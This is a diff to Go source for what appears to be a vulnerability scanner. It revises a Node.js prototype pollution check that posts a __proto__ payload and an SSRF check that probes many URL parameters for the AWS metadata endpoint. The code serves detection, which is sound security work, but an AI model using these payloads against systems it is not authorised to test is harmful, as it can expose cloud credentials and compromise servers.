@@ -1994,7 +1994,7 @@ func (p *JavaDeserializationPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 47. NODE.JS PROTOTYPE POLLUTION
+// 47. NODE.JS PROTOTYPE POLLUTION - v2
 type PrototypePollutionPlugin struct{}
 
 func (p *PrototypePollutionPlugin) Name() string { return "Node.js Prototype Pollution" }
@@ -2002,22 +2002,39 @@ func (p *PrototypePollutionPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	// Try to pollute Object Prototype via JSON payload
-	payload := `{"__proto__": {"dorm_polluted": true}}`
-	req, _ := http.NewRequest("POST", getURL(target, "/"), strings.NewReader(payload))
-	req.Header.Set("Content-Type", "application/json")
-	resp, err := getClient().Do(req)
 
+	client := getClient()
+	baseURL := getURL(target, "/")
+
+	// Payload: Attempt to inject properties into Object.prototype
+	// Detects if the server merges recursive JSON structures insecurely.
+	payload := `{"__proto__":{"dorm_check": "polluted"}, "constructor": {"prototype": {"dorm_check": "polluted"}}}`
+
+	req, _ := http.NewRequest("POST", baseURL, strings.NewReader(payload))
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := client.Do(req)
 	if err == nil {
 		defer resp.Body.Close()
-		// Check effect in second request (Basic check, detailed analysis requires more)
-		// This detects "suspicious behavior".
-		if resp.StatusCode == 500 { // Suspect if crash or error occurs
-			return &Vulnerability{
-				Target: target, Name: "Prototype Pollution Suspected", Severity: "MEDIUM", CVSS: 6.0,
-				Description: "JSON payload caused server error.",
-				Solution:    "Validate input types.",
-				Reference:   "",
+
+		// Logic: Check if the injected key is reflected in the response.
+		// While reflection doesn't guarantee RCE, it strongly indicates
+		// unsafe object merging (Prototype Pollution).
+
+		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+			bodyBytes, _ := io.ReadAll(resp.Body)
+
+			// Check if our canary string 'dorm_check' appears in the response
+			if strings.Contains(string(bodyBytes), "dorm_check") {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "Prototype Pollution Suspected",
+					Severity:    "MEDIUM",
+					CVSS:        6.5,
+					Description: "Server accepts and reflects special keys (__proto__, constructor) in JSON body.",
+					Solution:    "Implement strict JSON schema validation and freeze Object.prototype.",
+					Reference:   "CWE-1321",
+				}
 			}
 		}
 	}
@@ -2931,28 +2948,43 @@ func (p *BruteForcePlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 74. SSRF CLOUD METADATA (AWS/GCP/Azure)
+// 74. SSRF CLOUD METADATA - v2
 type SSRFMetadataPlugin struct{}
 
-func (p *SSRFMetadataPlugin) Name() string { return "SSRF Cloud Metadata" }
+func (p *SSRFMetadataPlugin) Name() string { return "SSRF Cloud Metadata (Pro)" }
 func (p *SSRFMetadataPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
-	// DÜZELTME: Gereksiz 'payloads' listesi silindi. Direkt URL tanımlandı.
-	targetURL := getURL(target, "/?url=http://169.254.169.254/latest/meta-data/")
+	client := getClient()
+	// AWS Metadata IP
+	ssrfPayload := "http://169.254.169.254/latest/meta-data/"
 
-	resp, err := getClient().Get(targetURL)
-	if err == nil {
-		defer resp.Body.Close()
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		body := string(bodyBytes)
-		if resp.StatusCode == 200 && (strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id")) {
-			return &Vulnerability{
-				Target: target, Name: "Cloud SSRF (Metadata Leak)", Severity: "CRITICAL", CVSS: 10.0,
-				Description: "Server performs requests to Cloud Metadata services, exposing IAM credentials.",
-				Solution:    "Disable metadata service access or enforce IMDSv2.", Reference: "CWE-918",
+	// Common parameters prone to SSRF
+	params := []string{"url", "uri", "link", "dest", "redirect", "source", "file", "u", "r"}
+
+	for _, param := range params {
+		// Construct Payload: target.com/?url=http://169.254.169.254/...
+		targetURL := fmt.Sprintf("%s/?%s=%s", getURL(target, ""), param, ssrfPayload)
+
+		resp, err := client.Get(targetURL)
+		if err == nil {
+			bodyBytes, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			body := string(bodyBytes)
+
+			// Check for AWS Metadata signature in response
+			if resp.StatusCode == 200 && (strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") || strings.Contains(body, "iam/security-credentials")) {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "Cloud SSRF (Metadata Leak)",
+					Severity:    "CRITICAL",
+					CVSS:        10.0,
+					Description: fmt.Sprintf("Server fetched Cloud Metadata via parameter '%s'.\nThis exposes critical IAM credentials.", param),
+					Solution:    "Disable access to 169.254.169.254 or enforce IMDSv2.",
+					Reference:   "CWE-918 / Cloud Security",
+				}
 			}
 		}
 	}
